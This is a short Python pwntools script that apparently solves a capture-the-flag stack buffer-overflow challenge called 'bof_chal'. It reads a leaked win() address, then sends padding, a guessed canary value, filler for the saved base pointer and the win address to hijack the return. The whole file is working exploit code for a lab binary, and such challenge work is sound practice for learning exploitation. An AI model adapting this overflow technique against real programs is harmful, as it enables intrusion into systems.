from pwn import *

p = process("./bof_chal")
p.recvuntil(b"address: ")
win_addr = int(p.recvline().strip(), 16)
log.success(f"win() @ {hex(win_addr)}")

payload = b""
payload += b"A" * 104 #Overwriting stack until canary
payload += p32(0xbeef) #Bypassing Canary
payload += b"B" * 8 #Overwriting saved rbp -> Return base pointer, back to the original main function
payload += p64(win_addr)

p.sendlineafter(b"input: ", payload)
p.interactive()
